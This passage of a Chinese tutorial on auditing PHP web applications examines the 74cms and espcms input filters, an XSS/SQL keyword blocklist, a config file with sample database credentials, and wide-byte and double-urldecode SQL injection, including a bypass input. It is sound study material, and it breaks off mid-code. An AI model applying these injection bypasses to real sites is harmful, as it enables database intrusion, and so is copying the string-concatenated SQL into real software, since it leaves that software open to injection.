<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line">function addslashes_deep($value)</div><div class="line">&#123;</div><div class="line">    if (empty($value))</div><div class="line">    &#123;</div><div class="line">        return $value;</div><div class="line">    &#125;</div><div class="line">    else</div><div class="line">    &#123;</div><div class="line">		if (!get_magic_quotes_gpc())</div><div class="line">		&#123;</div><div class="line">		$value=is_array($value) ? array_map(&apos;addslashes_deep&apos;, $value) : mystrip_tags(addslashes($value));</div><div class="line">		&#125;</div><div class="line">		else</div><div class="line">		&#123;</div><div class="line">		$value=is_array($value) ? array_map(&apos;addslashes_deep&apos;, $value) : mystrip_tags($value);</div><div class="line">		&#125;</div><div class="line">		return $value;</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>该函数将传入的变量使用addslashes()函数对单引号、双引号、NULL字符以及斜杠过滤。在SQL注入等漏洞时，只要参数在拼接SQL语句前，使用addslashes()函数就不能注入了，除非有宽字节注入或其他特殊情况。</p>
<p>接下来是一个XSS过滤的函数mystrip_tags()，代码如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">function mystrip_tags($string)</div><div class="line">&#123;</div><div class="line">	$string = new_html_special_chars($string);</div><div class="line">	$string = remove_xss($string);</div><div class="line">	return $string;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>函数mystrip_tags()中调用new_html_special_chars()和remove_xss函数来过滤XSS。<br>代码如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div></pre></td><td class="code"><pre><div class="line">function new_html_special_chars($string) &#123;</div><div class="line">	$string = str_replace(array(&apos;&amp;amp;&apos;, &apos;&amp;quot;&apos;, &apos;&amp;lt;&apos;, &apos;&amp;gt;&apos;), array(&apos;&amp;&apos;, &apos;&quot;&apos;, &apos;&lt;&apos;, &apos;&gt;&apos;), $string);</div><div class="line">	$string = strip_tags($string);</div><div class="line">	return $string;</div><div class="line">&#125;</div><div class="line">function remove_xss($string) &#123; </div><div class="line">    $string = preg_replace(&apos;/[\x00-\x08\x0B\x0C\x0E-\x1F\x7F]+/S&apos;, &apos;&apos;, $string);</div><div class="line"></div><div class="line">    $parm1 = Array(&apos;javascript&apos;, &apos;union&apos;,&apos;vbscript&apos;, &apos;expression&apos;, &apos;applet&apos;, &apos;xml&apos;, &apos;blink&apos;, &apos;link&apos;, &apos;script&apos;, &apos;embed&apos;, &apos;object&apos;, &apos;iframe&apos;, &apos;frame&apos;, &apos;frameset&apos;, &apos;ilayer&apos;, &apos;layer&apos;, &apos;bgsound&apos;, &apos;title&apos;, &apos;base&apos;);</div><div class="line"></div><div class="line">    $parm2 = Array(&apos;onabort&apos;, &apos;onactivate&apos;, &apos;onafterprint&apos;, &apos;onafterupdate&apos;, &apos;onbeforeactivate&apos;, &apos;onbeforecopy&apos;, &apos;onbeforecut&apos;, &apos;onbeforedeactivate&apos;, &apos;onbeforeeditfocus&apos;, &apos;onbeforepaste&apos;, &apos;onbeforeprint&apos;, &apos;onbeforeunload&apos;, &apos;onbeforeupdate&apos;, &apos;onblur&apos;, &apos;onbounce&apos;, &apos;oncellchange&apos;, &apos;onchange&apos;, &apos;onclick&apos;, &apos;oncontextmenu&apos;, &apos;oncontrolselect&apos;, &apos;oncopy&apos;, &apos;oncut&apos;, &apos;ondataavailable&apos;, &apos;ondatasetchanged&apos;, &apos;ondatasetcomplete&apos;, &apos;ondblclick&apos;, &apos;ondeactivate&apos;, &apos;ondrag&apos;, &apos;ondragend&apos;, &apos;ondragenter&apos;, &apos;ondragleave&apos;, &apos;ondragover&apos;, &apos;ondragstart&apos;, &apos;ondrop&apos;, &apos;onerror&apos;, &apos;onerrorupdate&apos;, &apos;onfilterchange&apos;, &apos;onfinish&apos;, &apos;onfocus&apos;, &apos;onfocusin&apos;, &apos;onfocusout&apos;, &apos;onhelp&apos;, &apos;onkeydown&apos;, &apos;onkeypress&apos;, &apos;onkeyup&apos;, &apos;onlayoutcomplete&apos;, &apos;onload&apos;, &apos;onlosecapture&apos;, &apos;onmousedown&apos;, &apos;onmouseenter&apos;, &apos;onmouseleave&apos;, &apos;onmousemove&apos;, &apos;onmouseout&apos;, &apos;onmouseover&apos;, &apos;onmouseup&apos;, &apos;onmousewheel&apos;, &apos;onmove&apos;, &apos;onmoveend&apos;, &apos;onmovestart&apos;, &apos;onpaste&apos;, &apos;onpropertychange&apos;, &apos;onreadystatechange&apos;, &apos;onreset&apos;, &apos;onresize&apos;, &apos;onresizeend&apos;, &apos;onresizestart&apos;, &apos;onrowenter&apos;, &apos;onrowexit&apos;, &apos;onrowsdelete&apos;, &apos;onrowsinserted&apos;, &apos;onscroll&apos;, &apos;onselect&apos;, &apos;onselectionchange&apos;, &apos;onselectstart&apos;, &apos;onstart&apos;, &apos;onstop&apos;, &apos;onsubmit&apos;, &apos;onunload&apos;,&apos;style&apos;,&apos;href&apos;,&apos;action&apos;,&apos;location&apos;,&apos;background&apos;,&apos;src&apos;,&apos;poster&apos;);</div><div class="line">	</div><div class="line">	$parm3 = Array(&apos;alert&apos;,&apos;sleep&apos;,&apos;load_file&apos;,&apos;confirm&apos;,&apos;prompt&apos;,&apos;benchmark&apos;,&apos;select&apos;,&apos;update&apos;,&apos;insert&apos;,&apos;delete&apos;,&apos;alter&apos;,&apos;drop&apos;,&apos;truncate&apos;,&apos;script&apos;,&apos;eval&apos;);</div><div class="line"></div><div class="line">    $parm = array_merge($parm1, $parm2, $parm3); </div><div class="line"></div><div class="line">	for ($i = 0; $i &lt; sizeof($parm); $i++) &#123; </div><div class="line">		$pattern = &apos;/&apos;; </div><div class="line">		for ($j = 0; $j &lt; strlen($parm[$i]); $j++) &#123; </div><div class="line">			if ($j &gt; 0) &#123; </div><div class="line">				$pattern .= &apos;(&apos;; </div><div class="line">				$pattern .= &apos;(&amp;#[x|X]0([9][a][b]);?)?&apos;; </div><div class="line">				$pattern .= &apos;|(&amp;#0([9][10][13]);?)?&apos;; </div><div class="line">				$pattern .= &apos;)?&apos;; </div><div class="line">			&#125;</div><div class="line">			$pattern .= $parm[$i][$j]; </div><div class="line">		&#125;</div><div class="line">		$pattern .= &apos;/i&apos;;</div><div class="line">		$string = preg_replace($pattern, &apos;****&apos;, $string); </div><div class="line">	&#125;</div><div class="line">	return $string;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>在new_heml_special_chars()函数中可以看到，这个函数对&amp;符号、双引号以及尖括号进行了html实体编码，并使用strip_tags()函数进行了二次过滤。而remove_xss()函数则是对一些标签关键字、事件关键字以及敏感函数关键字进行了替换。</p>
<p>继续往下看，可以看到一个SQL查询统一操作函数inserttable()以及updatetable()函数，大多数SQL语句执行都会经过这里。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div></pre></td><td class="code"><pre><div class="line">function inserttable($tablename, $insertsqlarr, $returnid=0, $replace = false, $silent=0) &#123;</div><div class="line">	global $db;</div><div class="line">	$insertkeysql = $insertvaluesql = $comma = &apos;&apos;;</div><div class="line">	foreach ($insertsqlarr as $insert_key =&gt; $insert_value) &#123;</div><div class="line">		$insertkeysql .= $comma.&apos;`&apos;.$insert_key.&apos;`&apos;;</div><div class="line">		$insertvaluesql .= $comma.&apos;\&apos;&apos;.$insert_value.&apos;\&apos;&apos;;</div><div class="line">		$comma = &apos;, &apos;;</div><div class="line">	&#125;</div><div class="line">	$method = $replace?&apos;REPLACE&apos;:&apos;INSERT&apos;;</div><div class="line">	// echo $method.&quot; INTO $tablename ($insertkeysql) VALUES ($insertvaluesql)&quot;, $silent?&apos;SILENT&apos;:&apos;&apos;;die;</div><div class="line">	$state = $db-&gt;query($method.&quot; INTO $tablename ($insertkeysql) VALUES ($insertvaluesql)&quot;, $silent?&apos;SILENT&apos;:&apos;&apos;);</div><div class="line">	if($returnid &amp;&amp; !$replace) &#123;</div><div class="line">		return $db-&gt;insert_id();</div><div class="line">	&#125;else &#123;</div><div class="line">	    return $state;</div><div class="line">	&#125; </div><div class="line">&#125;</div><div class="line">function updatetable($tablename, $setsqlarr, $wheresqlarr, $silent=0) &#123;</div><div class="line">	global $db;</div><div class="line">	$setsql = $comma = &apos;&apos;;</div><div class="line">	foreach ($setsqlarr as $set_key =&gt; $set_value) &#123;</div><div class="line">		if(is_array($set_value)) &#123;</div><div class="line">			$setsql .= $comma.&apos;`&apos;.$set_key.&apos;`&apos;.&apos;=\&apos;&apos;.$set_value[0].&apos;\&apos;&apos;;</div><div class="line">		&#125; else &#123;</div><div class="line">			$setsql .= $comma.&apos;`&apos;.$set_key.&apos;`&apos;.&apos;=\&apos;&apos;.$set_value.&apos;\&apos;&apos;;</div><div class="line">		&#125;</div><div class="line">		$comma = &apos;, &apos;;</div><div class="line">	&#125;</div><div class="line">	$where = $comma = &apos;&apos;;</div><div class="line">	if(empty($wheresqlarr)) &#123;</div><div class="line">		$where = &apos;1&apos;;</div><div class="line">	&#125; elseif(is_array($wheresqlarr)) &#123;</div><div class="line">		foreach ($wheresqlarr as $key =&gt; $value) &#123;</div><div class="line">			$where .= $comma.&apos;`&apos;.$key.&apos;`&apos;.&apos;=\&apos;&apos;.$value.&apos;\&apos;&apos;;</div><div class="line">			$comma = &apos; AND &apos;;</div><div class="line">		&#125;</div><div class="line">	&#125; else &#123;</div><div class="line">		$where = $wheresqlarr;</div><div class="line">	&#125;</div><div class="line">	return $db-&gt;query(&quot;UPDATE &quot;.($tablename).&quot; SET &quot;.$setsql.&quot; WHERE &quot;.$where, $silent?&quot;SILENT&quot;:&quot;&quot;);</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>在这两个函数下面有一个wheresql()函数，是SQL语句查询的Where条件拼接的地方，参数都使用了单引号进行包裹。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line">function wheresql($wherearr=&apos;&apos;)</div><div class="line">&#123;</div><div class="line">	$wheresql=&quot;&quot;;</div><div class="line">	if (is_array($wherearr))</div><div class="line">		&#123;</div><div class="line">		$where_set=&apos; WHERE &apos;;</div><div class="line">			foreach ($wherearr as $key =&gt; $value)</div><div class="line">			&#123;</div><div class="line">			$wheresql .=$where_set. $comma.$key.&apos;=&quot;&apos;.$value.&apos;&quot;&apos;;</div><div class="line">			$comma = &apos; AND &apos;;</div><div class="line">			$where_set=&apos; &apos;;</div><div class="line">			&#125;</div><div class="line">		&#125;</div><div class="line">	return $wheresql;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<h4 id="查看配置文件"><a href="#查看配置文件" class="headerlink" title="查看配置文件"></a>查看配置文件</h4><p>根据config关键字，在data目录下找到两个php文件，config.php和cache_config.php。打开config.php查看代码，如下所示：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">$dbhost   = &quot;localhost&quot;;</div><div class="line"></div><div class="line">$dbname   = &quot;74cms&quot;;</div><div class="line"></div><div class="line">$dbuser   = &quot;root&quot;;</div><div class="line"></div><div class="line">$dbpass   = &quot;uknow&quot;;</div><div class="line"></div><div class="line">$pre    = &quot;qs_&quot;;</div><div class="line"></div><div class="line">$QS_cookiedomain = &apos;&apos;;</div><div class="line"></div><div class="line">$QS_cookiepath =  &quot;/74cms/&quot;;</div><div class="line"></div><div class="line">$QS_pwdhash = &quot;E:=KR11lO01vHU3i&quot;;</div><div class="line"></div><div class="line">define(&apos;QISHI_CHARSET&apos;,&apos;gb2312&apos;);</div><div class="line"></div><div class="line">define(&apos;QISHI_DBCHARSET&apos;,&apos;GBK&apos;);</div><div class="line"></div><div class="line">?&gt;</div></pre></td></tr></table></figure></p>
<p>根据以上代码可以看到数据库连接配置信息和网站配置信息，其中用define定义了一个常量QISHI_DBCHARSET，其值为GBK编码。可以知道数据库编码是GBK，接着我们看下数据库连接时设置的编码，判断是否进行宽字节注入。</p>
<p>在includ\mysql.class.php文件的connect()函数，代码如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line">function connect($dbhost, $dbuser, $dbpw, $dbname = &apos;&apos;, $dbcharset = &apos;gbk&apos;, $connect=1)&#123;</div><div class="line">	$func = empty($connect) ? &apos;mysql_pconnect&apos; : &apos;mysql_connect&apos;;</div><div class="line">	if(!$this-&gt;linkid = @$func($dbhost, $dbuser, $dbpw, true))&#123;</div><div class="line">		$this-&gt;dbshow(&apos;Can not connect to Mysql!&apos;);</div><div class="line">	&#125; else &#123;</div><div class="line">		if($this-&gt;dbversion() &gt; &apos;4.1&apos;)&#123;</div><div class="line">			mysql_query( &quot;SET NAMES gbk&quot;);</div><div class="line">			if($this-&gt;dbversion() &gt; &apos;5.0.1&apos;)&#123;</div><div class="line">				mysql_query(&quot;SET sql_mode = &apos;&apos;&quot;,$this-&gt;linkid);</div><div class="line">	mysql_query(&quot;SET character_set_connection=&quot;.$dbcharset.&quot;, character_set_results=&quot;.$dbcharset.&quot;, character_set_client=binary&quot;, $this-&gt;linkid);</div><div class="line">			&#125;</div><div class="line">		&#125;</div><div class="line">	&#125;</div><div class="line">	if($dbname)&#123;</div><div class="line">		if(mysql_select_db($dbname, $this-&gt;linkid)===false)&#123;</div><div class="line">			$this-&gt;dbshow(&quot;Can&apos;t select MySQL database($dbname)!&quot;);</div><div class="line">		&#125;</div><div class="line">	&#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>在这个函数里可以知道，它根据mysql的版本的不同对编码进行了不同的设置。<br>先判断MySQL的版本是否大于4.1，如果是则执行如下代码：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">mysql_query( &quot;SET NAMES gbk&quot;);</div></pre></td></tr></table></figure></p>
<p>set names gbk就是把character_set_connection、character_set_results、character_set_client都设置为gbk编码。</p>
<p>然后在判断MySQl的版本是否大于5.0.1,如果是则执行如下代码：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">  	mysql_query(&quot;SET sql_mode = &apos;&apos;&quot;,$this-&gt;linkid);</div><div class="line">mysql_query(&quot;SET character_set_connection=&quot;.$dbcharset.&quot;, character_set_results=&quot;.$dbcharset.&quot;, character_set_client=binary&quot;, $this-&gt;linkid);</div></pre></td></tr></table></figure></p>
<p>以上代码把character_set_client设置为binary（二进制），即character_set_client:客户端发送过来的SQL语句编码，也就是PHP发送的SQL查询语句编码字符集。这是常见的方法来预防宽字节注入。</p>
<p>当mysql接受到客户端的数据后，会认为他的编码是character_set_client，然后会将之将换成character_set_connection的编码，然后进入具体表和字段后，再转换成字段对应的编码。<br>然后，当查询结果产生后，会从表和字段的编码，转换成character_set_results编码，返回给客户端。<br>所以，将character_set_client设置成binary，就不存在宽字节或多字节的问题了，所有数据以二进制的形式传递，就能有效避免宽字符注入。</p>
<p>所以在MySQL版本大于4.4小于5的情况下，基本所有跟数据库有关的操作都存在宽字节注入。</p>
<h4 id="跟读首页文件"><a href="#跟读首页文件" class="headerlink" title="跟读首页文件"></a>跟读首页文件</h4><p>打开index.php可以看到如下代码：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">if(!file_exists(dirname(__FILE__).&apos;/data/install.lock&apos;)) header(&quot;Location:install/index.php&quot;);</div><div class="line">define(&apos;IN_QISHI&apos;, true);</div><div class="line">$alias=&quot;QS_index&quot;;</div><div class="line">require_once(dirname(__FILE__).&apos;/include/common.inc.php&apos;);</div></pre></td></tr></table></figure></p>
<p>首先看到判断install.lock文件是否存在，如果不存在则重定向到install/index.php进行cms的安装。接下来是包含/include/common.inc.php文件，跟进查看此文件。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">session_start();</div><div class="line">require_once(QISHI_ROOT_PATH.&apos;data/config.php&apos;);</div><div class="line">header(&quot;Content-Type:text/html;charset=&quot;.QISHI_CHARSET);</div><div class="line">require_once(QISHI_ROOT_PATH.&apos;include/common.fun.php&apos;);</div><div class="line">require_once(QISHI_ROOT_PATH.&apos;include/74cms_version.php&apos;);</div></pre></td></tr></table></figure></p>
<p>在/include/common.inc.php的开头包含了三个文件，data/config.php、include/common.fun.php和include/74cms_version.php<br>data/config.php是前面说到的配置文件，include/common.fun.php是基本函数文件，include/74cms_version.php是应用版本文件。</p>
<p>接着下面是如下代码：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">if (!empty($_GET))</div><div class="line">&#123;</div><div class="line">$_GET  = addslashes_deep($_GET);</div><div class="line">&#125;</div><div class="line">if (!empty($_POST))</div><div class="line">&#123;</div><div class="line">$_POST = addslashes_deep($_POST);</div><div class="line">&#125;</div><div class="line">$_COOKIE   = addslashes_deep($_COOKIE);</div><div class="line">$_REQUEST  = addslashes_deep($_REQUEST);</div></pre></td></tr></table></figure></p>
<p>调用include/common.fun.php中的addslashe_deep()函数对GET,POST,COOKIE请求参数进行过滤，再往下又可以看到一个包含文件操作：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">require_once(QISHI_ROOT_PATH.&apos;include/tpl.inc.php&apos;);</div></pre></td></tr></table></figure></p>
<p>查看include/tpl.inc.php，这是用来初始化模版引擎的。代码如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line">if(!defined(&apos;IN_QISHI&apos;))</div><div class="line">&#123;</div><div class="line">die(&apos;Access Denied!&apos;);</div><div class="line">&#125;</div><div class="line">include_once(QISHI_ROOT_PATH.&apos;include/template_lite/class.template.php&apos;);</div><div class="line">$smarty = new Template_Lite; </div><div class="line">$smarty -&gt; cache_dir = QISHI_ROOT_PATH.&apos;temp/caches/&apos;.$_CFG[&apos;template_dir&apos;];</div><div class="line">$smarty -&gt; compile_dir =  QISHI_ROOT_PATH.&apos;temp/templates_c/&apos;.$_CFG[&apos;template_dir&apos;];</div><div class="line">$smarty -&gt; template_dir = QISHI_ROOT_PATH.&apos;templates/&apos;.$_CFG[&apos;template_dir&apos;];</div><div class="line">$smarty -&gt; reserved_template_varname = &quot;smarty&quot;;</div><div class="line">$smarty -&gt; left_delimiter = &quot;&#123;#&quot;;</div><div class="line">$smarty -&gt; right_delimiter = &quot;#&#125;&quot;;</div><div class="line">$smarty -&gt; force_compile = false;</div><div class="line">$smarty -&gt; assign(&apos;_PLUG&apos;, $_PLUG);</div><div class="line">$smarty -&gt; assign(&apos;QISHI&apos;, $_CFG);</div><div class="line">$smarty -&gt; assign(&apos;page_select&apos;,$page_select);</div><div class="line">?&gt;</div></pre></td></tr></table></figure></p>
<p>在上述代码中包含了一个include/template_lite/class.template.php文件。这是一个smarty模版引擎的类，无需进一步分析。用tpl.inc.php实例化了这个类对象赋值给$smarty变量，接着回到common.onc.php<br>再由common.inc.php回到index.php,接下来就是smarty模版引擎的操作了。</p>
<h2 id="根据功能点定向审计"><a href="#根据功能点定向审计" class="headerlink" title="根据功能点定向审计"></a>根据功能点定向审计</h2><p>以下几个功能点经常会出现漏洞</p>
<ul>
<li>文件上传功能（任意文件上传）</li>
<li>文件管理功能（任意文件读取），利用../或者..\跳转目录</li>
<li>登录认证功能（越权漏洞）</li>
<li>找回密码功能（验证码爆破）</li>
</ul>
<h1 id="漏洞挖掘与防范"><a href="#漏洞挖掘与防范" class="headerlink" title="漏洞挖掘与防范"></a>漏洞挖掘与防范</h1><h2 id="SQL注入漏洞"><a href="#SQL注入漏洞" class="headerlink" title="SQL注入漏洞"></a>SQL注入漏洞</h2><p>SQL注入漏洞的原理非常简单，由于开发者在编写操作数据库代码时，直接将外部可控的参数拼接到SQL语句中，没有经过任何过滤就直接放入数据库引擎执行。</p>
<h3 id="挖掘经验"><a href="#挖掘经验" class="headerlink" title="挖掘经验"></a>挖掘经验</h3><p>SQL注入经常出现在登录页面、获取HTTP头、订单处理等地方。另外在订单系统里面，由于订单涉及购物车等多个交互，所哟经常会发生二次注入。</p>
<h4 id="普通注入"><a href="#普通注入" class="headerlink" title="普通注入"></a>普通注入</h4><p>普通注入有int型和string型，在string型注入中需要引用单引号或者双引号进行闭合。<br>数据库操作存在一些关键字，比如select from、mysql_connect、mysql_query、mysql_fetch_row等，数据库的查询方式还有update、insert、delete。在审计时，只需要查找这些关键字，即可定向挖掘SQL注入漏洞</p>
<h4 id="编码注入"><a href="#编码注入" class="headerlink" title="编码注入"></a>编码注入</h4><p>常见的编码注入是MySQL宽字节以及urldecode/rawurldecode函数导致的。</p>
<ul>
<li><p>宽字节注入<br>出现这个漏洞的原因是在PHP连接MySQL的时候执行了设置：set character_set_client=gbk，MySQL服务器客户端来源数据编码是GBK，然后MySQL服务器对查询语句进行GBK转码导致反斜杠\被%df吃掉。</p>
</li>
<li><p>漏洞解决方式<br>1.设置character_set_client=binary<br>2.使用mysql_set_charset(‘gbk’)设置编码，然后使用mysql_real_escape_string()函数被参数过滤<br>3.使用pdo方式，在PHP5.3.6及以下版本需要设置setAttribute(PDO::ATTR_EMULATE_PREPARES,flase);来禁用preoared statements的仿真效果。</p>
</li>
<li><p>挖掘关键字</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">SET NAMES</div><div class="line">character_set_client=gbk</div><div class="line">mysql_set_charset(&apos;gbk&apos;)</div></pre></td></tr></table></figure>
</li>
<li><p>二次urldecode注入<br>使用urldecode或者rawurldecode函数，会导致二次解码生成单引号而引发注入。原理是提交参数到WebServer时，WebServer会自动解码一次，如果开启了GPC，提交id=1%2527，第一次解码结果是id=1%27，%25解码的结果是%，如果程序里使用了urlcode或rawurlcode函数来解码id参数，则解码后的结果是id=1’单引号成功出现引发注入。</p>
</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">$a=addslashes($_GET[&apos;p&apos;]);</div><div class="line">$b=urldecode($a);</div><div class="line">echo &apos;$a=&apos;.$a;</div><div class="line">echo &apos;&lt;br /&gt;&apos;;</div><div class="line">echo &apos;$b=&apos;.$b;</div><div class="line">?&gt;</div></pre></td></tr></table></figure>
<p><img src="http://obr4sfdq7.bkt.clouddn.com/urldecode.png" alt=""></p>
<ul>
<li>挖掘关键字<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">urldecode</div><div class="line">rawurldecode</div></pre></td></tr></table></figure>
</li>
</ul>
<h4 id="espcms搜索注入分析"><a href="#espcms搜索注入分析" class="headerlink" title="espcms搜索注入分析"></a>espcms搜索注入分析</h4><p>在interface\search.php的in_taglist()函数中</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line">function in_taglist() &#123;</div><div class="line">	parent::start_pagetemplate();</div><div class="line">	include_once admin_ROOT . &apos;public/class_pagebotton.php&apos;;</div><div class="line"></div><div class="line">	$page = $this-&gt;fun-&gt;accept(&apos;page&apos;, &apos;G&apos;);</div><div class="line">	$page = isset($page) ? intval($page) : 1;</div><div class="line">	$lng = (admin_LNG == &apos;big5&apos;) ? $this-&gt;CON[&apos;is_lancode&apos;] : admin_LNG;</div><div class="line">	$tagkey = urldecode($this-&gt;fun-&gt;accept(&apos;tagkey&apos;, &apos;R&apos;));</div><div class="line">	$tagkey = $this-&gt;fun-&gt;inputcodetrim($tagkey);</div><div class="line"></div><div class="line">	$db_where = &apos; WHERE lng=\&apos;&apos; . $lng . &apos;\&apos; AND isclass=1&apos;;</div><div class="line">	if (empty($tagkey)) &#123;</div><div class="line">		$linkURL = $_SERVER[&apos;HTTP_REFERER&apos;];</div><div class="line">		$this-&gt;callmessage($this-&gt;lng[&apos;search_err&apos;], $linkURL, $this-&gt;lng[&apos;gobackbotton&apos;]);</div><div class="line">	&#125;</div><div class="line">	if (!empty($tagkey)) &#123;</div><div class="line">		$db_where.=&quot; AND FIND_IN_SET(&apos;$tagkey&apos;,tags)&quot;;</div><div class="line">	&#125;</div></pre></td></tr></table></figure>
<p>其中tagkey变量使用了urldecode可以用来绕过GPC,回溯构造exp。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">$tagkey = urldecode($this-&gt;fun-&gt;accept(&apos;tagkey&apos;, &apos;R&apos;));</div><div class="line"></div><div class="line">$db_where.=&quot; AND FIND_IN_SET(&apos;$tagkey&apos;,tags)&quot;;</div></pre></td></tr></table></figure></p>
<p>在index.php中如下代码片段：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div></pre></td><td class="code"><pre><div class="line">$archive = indexget(&apos;ac&apos;, &apos;R&apos;);</div><div class="line">$action = indexget(&apos;at&apos;, &apos;R&apos;);</div><div class="line"></div><div class="line">if (empty($archive) || empty($action)) &#123;</div><div class="line">	include admin_ROOT . &apos;interface/public.php&apos;;</div><div class="line">	$mainlist = new mainpage();</div><div class="line">	if (method_exists($mainlist, &apos;in_index&apos;)) &#123;</div><div class="line">		$mainlist-&gt;in_index();</div><div class="line">	&#125; else &#123;</div><div class="line">		exit(&apos;Access error!&apos;);</div><div class="line">	&#125;</div><div class="line">&#125; else &#123;</div><div class="line">	if (in_array($archive, 